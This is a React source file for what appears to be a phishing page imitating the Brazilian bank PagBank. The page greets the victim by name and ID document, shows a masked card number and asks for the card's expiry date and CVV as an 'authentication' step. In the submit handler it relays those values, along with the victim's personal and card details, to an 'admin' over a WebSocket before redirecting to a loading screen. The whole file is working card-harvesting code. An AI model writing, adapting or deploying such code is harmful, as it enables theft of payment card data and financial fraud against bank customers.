import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import FormattedInput from "@/components/FormattedInput";
import { formatExpiryDate, formatCVV } from "@/lib/utils";
import { useSocket } from "@/hooks/useSocket";

export default function CardAuthPage() {
  const [userData, setUserData] = useState({
    name: "",
    document: "",
    formattedDocument: "",
    cardNumber: "",
    maskedCardNumber: "",
  });
  
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState({ expiryDate: "", cvv: "" });
  const [isLoading, setIsLoading] = useState(false);
  const [isDataLoading, setIsDataLoading] = useState(true);
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const { socket } = useSocket();

  // Fetch user data
  useEffect(() => {
    const fetchUserData = async () => {
      try {
        const res = await apiRequest("GET", "/api/user/data");
        if (res.ok) {
          const data = await res.json();
          setUserData(data);
        } else {
          navigate("/");
          toast({
            title: "Erro",
            description: "Sessão expirada ou usuário não encontrado",
            variant: "destructive",
          });
        }
      } catch (err) {
        console.error(err);
        navigate("/");
      } finally {
        setIsDataLoading(false);
      }
    };
    
    fetchUserData();
  }, [navigate, toast]);

  const validateExpiryDate = (value: string) => {
    if (!value) return "Data de validade é obrigatória";
    
    // Format check: MM/YYYY
    const regex = /^(0[1-9]|1[0-2])\/20\d{2}$/;
    if (!regex.test(value)) return "Formato inválido. Use MM/AAAA";
    
    // Check if date is in the future
    const [month, year] = value.split("/");
    const expiryDateObj = new Date(parseInt(year), parseInt(month) - 1, 1);
    const today = new Date();
    today.setDate(1);
    today.setHours(0, 0, 0, 0);
    
    if (expiryDateObj < today) return "Data de validade expirada";
    
    return "";
  };

  const validateCVV = (value: string) => {
    const cleanCVV = value.replace(/\D/g, "");
    if (!cleanCVV) return "Código de segurança é obrigatório";
    if (cleanCVV.length !== 3) return "Código deve ter 3 dígitos";
    return "";
  };

  const handleSubmit = async () => {
    // Validate form
    const expiryDateError = validateExpiryDate(expiryDate);
    const cvvError = validateCVV(cvv);
    
    setErrors({
      expiryDate: expiryDateError,
      cvv: cvvError,
    });
    
    if (expiryDateError || cvvError) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      const cardData = {
        expiryDate,
        cvv,
      };
      
      const res = await apiRequest("POST", "/api/user/card-auth", cardData);
      
      if (res.ok) {
        // Send data to admin through WebSocket
        if (socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({
            type: "CARD_AUTH",
            data: {
              ...userData,
              expiryDate,
              cvv,
            }
          }));
        }
        
        navigate("/loading");
      }
    } catch (err) {
      console.error(err);
      toast({
        title: "Erro",
        description: "Ocorreu um erro ao processar os dados do cartão",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (isDataLoading) {
    return (
      <div className="flex-grow flex items-center justify-center">
        <div className="animate-spin">
          <svg className="w-12 h-12 text-primary" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
          </svg>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-grow flex flex-col items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-white rounded-lg p-6 shadow-sm border border-gray-200">
          <div className="mb-6">
            <p className="text-lg font-medium mb-2">
              Olá sr(a). {userData.name}
            </p>
            <p className="text-gray-600">{userData.formattedDocument}</p>
            <p className="mt-4">Preencha as seguintes informações para autenticar o seu acesso:</p>
          </div>
          
          <div className="mb-6">
            <label className="block mb-2 text-sm font-medium text-gray-700">Número do cartão</label>
            <div className="bg-gray-100 p-3 rounded text-gray-700 flex justify-between">
              {userData.maskedCardNumber.split(" ").map((segment, index) => (
                <span key={index}>{segment}</span>
              ))}
            </div>
          </div>
          
          <div className="mb-6">
            <label htmlFor="expiry-date" className="block mb-2 text-sm font-medium text-gray-700">
              Data de validade (MM/AAAA)
            </label>
            <FormattedInput
              id="expiry-date"
              value={expiryDate}
              onChange={(value) => {
                setExpiryDate(value);
                if (errors.expiryDate) {
                  setErrors({ ...errors, expiryDate: "" });
                }
              }}
              formatter={formatExpiryDate}
              placeholder="MM/AAAA"
              className="pagbank-input"
              maxLength={7}
            />
            {errors.expiryDate && (
              <div className="text-red-500 text-sm mt-1">{errors.expiryDate}</div>
            )}
          </div>
          
          <div className="mb-6">
            <label htmlFor="cvv" className="block mb-2 text-sm font-medium text-gray-700">
              Código de Segurança (CVV)
            </label>
            <FormattedInput
              id="cvv"
              value={cvv}
              onChange={(value) => {
                setCvv(value);
                if (errors.cvv) {
                  setErrors({ ...errors, cvv: "" });
                }
              }}
              formatter={formatCVV}
              placeholder="000"
              className="pagbank-input"
              maxLength={3}
            />
            {errors.cvv && (
              <div className="text-red-500 text-sm mt-1">{errors.cvv}</div>
            )}
          </div>
          
          <button 
            className="pagbank-button-primary"
            onClick={handleSubmit}
            disabled={isLoading}
          >
            {isLoading ? "Processando..." : "Continuar"}
          </button>
        </div>
      </div>
    </div>
  );
}
